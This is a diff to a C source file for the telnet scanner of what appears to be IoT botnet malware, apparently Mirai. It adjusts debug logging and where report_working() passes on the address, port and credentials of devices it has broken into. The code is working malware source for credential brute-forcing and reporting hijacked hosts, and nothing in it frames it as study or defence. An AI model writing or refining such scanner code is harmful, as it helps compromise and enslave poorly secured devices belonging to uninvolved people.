@@ -487,16 +487,6 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
 #endif
-#ifdef DEBUG
-                                if (1==1)
-                                {
-                                    report_working(conn->dst_addr, conn->dst_port, conn->auth);
-                                    printf("[scanner] FD%d addr: %d.%d.%d.%d, port: %d, auth: %x\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff, conn->dst_port, conn->auth);
-                                    close(conn->fd);
-                                    conn->fd = -1;
-                                    conn->state = SC_CLOSED;
-                                }
-#endif
                             }
                             break;
                         case SC_WAITING_USERNAME:
@@ -650,8 +640,12 @@ void scanner_init(void)
                                 int tmp_len;
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
+                                conn->dst_port = 23;
 #endif
                                 report_working(conn->dst_addr, conn->dst_port, conn->auth);
+#ifdef DEBUG
+                                printf("[scanner] FD%d addr: %d.%d.%d.%d, port: %d, auth: %x\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff, conn->dst_port, conn->auth);
+#endif
                                 close(conn->fd);
                                 conn->fd = -1;
                                 conn->state = SC_CLOSED;
